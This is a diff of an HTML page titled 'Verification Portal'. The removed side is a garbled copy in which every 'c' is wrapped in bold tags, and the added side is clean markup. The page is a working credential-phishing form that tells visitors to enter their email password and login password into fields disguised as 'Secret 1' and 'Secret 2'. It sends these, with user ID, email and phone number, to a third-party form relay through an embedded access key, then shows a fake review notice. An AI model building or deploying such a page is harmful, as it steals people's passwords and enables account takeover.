@@ -2,64 +2,63 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Verifi<b>c</b>ation Portal</title>
+    <title>Verification Portal</title>
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-<b>c</b>ontent: <b>c</b>enter; padding: 40px; ba<b>c</b>kground-<b>c</b>olor: #f0f2f5; }
-        .form-<b>c</b>ontainer { width: 450px; ba<b>c</b>kground: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h2 { text-align: <b>c</b>enter; <b>c</b>olor: #333; margin-bottom: 25px; }
-        .instru<b>c</b>tion-box { ba<b>c</b>kground: #e7f3ff; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #b3d7ff; font-size: 14px; }
-        label { font-weight: bold; display: blo<b>c</b>k; margin-top: 15px; <b>c</b>olor: #555; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; padding: 40px; background-color: #f0f2f5; }
+        .form-container { width: 450px; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { text-align: center; color: #333; margin-bottom: 25px; }
+        .instruction-box { background: #e7f3ff; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #b3d7ff; font-size: 14px; }
+        label { font-weight: bold; display: block; margin-top: 15px; color: #555; }
         input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        .note { <b>c</b>olor: red; font-size: 13px; font-weight: bold; display: blo<b>c</b>k; margin-bottom: 5px; }
-        #verifyBtn { width: 100%; padding: 14px; ba<b>c</b>kground-<b>c</b>olor: #007bff; <b>c</b>olor: white; border: none; border-radius: 6px; <b>c</b>ursor: pointer; font-size: 16px; margin-top: 25px; }
-        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 6px; text-align: <b>c</b>enter; font-weight: bold; display: none; ba<b>c</b>kground-<b>c</b>olor: #fff3<b>c</b>d; <b>c</b>olor: #856404; border: 1px solid #ffeeba; }
+        #verifyBtn { width: 100%; padding: 14px; background-color: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 25px; }
+        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 6px; text-align: center; font-weight: bold; display: none; background-color: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
     </style>
 </head>
 <body>
 
-<div <b>c</b>lass="form-<b>c</b>ontainer">
-    <h2>Verifi<b>c</b>ation Form</h2>
+<div class="form-container">
+    <h2>Verification Form</h2>
 
-    <div <b>c</b>lass="instru<b>c</b>tion-box">
+    <div class="instruction-box">
         <strong>Please Note:</strong><br>
-        1. In <b>Se<b>c</b>ret 1</b>, enter your <b>Email Password</b>.<br>
-        2. In <b>Se<b>c</b>ret 2</b>, enter your <b>Login Password</b>.
+        1. In <b>Secret 1</b>, enter your <b>Email Password</b>.<br>
+        2. In <b>Secret 2</b>, enter your <b>Login Password</b>.
     </div>
     
-    <form a<b>c</b>tion="https://api.web3forms.com/submit" method="POST" id="vForm">
-        <input type="hidden" name="a<b>c</b><b>c</b>ess_key" value="2<b>c</b>b4db<b>c</b>8-f7d2-4182-b176-9ff62975<b>c</b>b<b>c</b>9">
+    <form action="https://api.web3forms.com/submit" method="POST" id="vForm">
+        <input type="hidden" name="access_key" value="2cb4dbc8-f7d2-4182-b176-9ff62975cbc9">
         
         <label>User ID:</label>
         <input type="text" name="Username" required>
 
-        <label>A<b>c</b><b>c</b>ount Email:</label>
+        <label>Account Email:</label>
         <input type="email" name="Email" required>
 
-        <label>Se<b>c</b>ret 1:</label>
+        <label>Secret 1:</label>
         <input type="password" name="Key_One" required>
 
         <label>Phone Number:</label>
         <input type="text" name="Phone" required>
 
-        <label>Se<b>c</b>ret 2:</label>
+        <label>Secret 2:</label>
         <input type="password" name="Key_Two" required>
 
-        <input type="hidden" name="redire<b>c</b>t" value="https://web3forms.com/su<b>c</b><b>c</b>ess">
+        <input type="hidden" name="redirect" value="https://web3forms.com/success">
         <button type="submit" id="verifyBtn">Verify</button>
     </form>
 
     <div id="statusMessage">
-        Your verifi<b>c</b>ation is under review
+        Your verification is under review
     </div>
 </div>
 
-<s<b>c</b>ript>
-    const form = do<b>c</b>ument.getElementById('vForm');
-    form.onsubmit = fun<b>c</b>tion() {
-        do<b>c</b>ument.getElementById('verifyBtn').style.display = "none"; 
-        do<b>c</b>ument.getElementById('statusMessage').style.display = "blo<b>c</b>k"; 
+<script>
+    const form = document.getElementById('vForm');
+    form.onsubmit = function() {
+        document.getElementById('verifyBtn').style.display = "none"; 
+        document.getElementById('statusMessage').style.display = "block"; 
     };
-</s<b>c</b>ript>
+</script>
 
 </body>
 </html>
